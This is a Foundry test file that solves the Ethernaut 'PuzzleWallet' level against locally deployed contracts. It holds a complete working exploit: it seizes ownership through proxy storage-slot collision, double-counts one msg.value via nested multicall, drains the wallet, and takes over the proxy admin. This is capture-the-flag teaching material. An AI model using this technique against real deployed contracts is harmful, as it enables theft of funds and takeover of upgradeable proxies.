// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/levels/PuzzleWallet.sol";

/// Ethernaut #24 "PuzzleWallet" → Aegis catalog `proxy-storage-collision`. The proxy and the wallet
/// share storage: `PuzzleProxy.pendingAdmin`/`admin` (slots 0/1) collide with `PuzzleWallet.owner`/
/// `maxBalance`. So `proposeNewAdmin` rewrites `owner`; then drain the wallet (a `multicall` nests a
/// second `multicall` to count one `msg.value` twice past the deposit-once guard); then `setMaxBalance`
/// writes the proxy `admin`. Win: proxy.admin() == player.
contract PuzzleWalletTest is Test {
    address player = makeAddr("player");
    address admin = makeAddr("admin");

    function test_solve_puzzleWallet() public {
        // Mirror the level: wallet impl behind a proxy, owner initialized to the deployer.
        PuzzleWallet impl = new PuzzleWallet();
        bytes memory initData = abi.encodeWithSignature("init(uint256)", uint256(100 ether));
        PuzzleProxy proxy = new PuzzleProxy(admin, address(impl), initData);
        PuzzleWallet wallet = PuzzleWallet(address(proxy));

        // seed: existing funds in the wallet (what the player will drain)
        wallet.addToWhitelist(address(this)); // deployer is owner here
        wallet.deposit{value: 0.001 ether}();
        assertEq(address(proxy).balance, 0.001 ether, "wallet seeded");

        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // 1) collision: proxy.pendingAdmin (slot 0) IS wallet.owner -> become owner
        proxy.proposeNewAdmin(player);
        assertEq(wallet.owner(), player, "owner seized via storage collision");

        // 2) whitelist self
        wallet.addToWhitelist(player);

        // 3) double-count msg.value: multicall([deposit, multicall([deposit])]) with one 0.001 ether
        bytes[] memory nested = new bytes[](1);
        nested[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", nested);
        wallet.multicall{value: 0.001 ether}(data); // balances[player] = 0.002, contract = 0.002

        // 4) drain the contract to zero
        wallet.execute(player, 0.002 ether, "");
        assertEq(address(proxy).balance, 0, "wallet drained");

        // 5) setMaxBalance (slot 1) IS proxy.admin -> become admin
        wallet.setMaxBalance(uint256(uint160(player)));
        vm.stopPrank();

        assertEq(proxy.admin(), player, "player is now the proxy admin");
    }
}
